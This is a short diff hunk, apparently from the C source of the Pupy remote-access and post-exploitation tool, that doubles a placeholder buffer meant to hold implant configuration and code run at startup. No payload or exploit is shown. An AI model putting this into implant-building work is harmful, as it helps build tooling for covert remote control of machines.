@@ -20,7 +20,7 @@ static char module_doc[] = "Builtins utilities for pupy";
 
 UINTPTR _load_dll(const char *name, const char *bytes);
 
-char pupy_config[32768]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup. scriptlets also takes more space !
+char pupy_config[65536]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup. scriptlets also takes more space !
 
 static PyObject *ExecError;
 
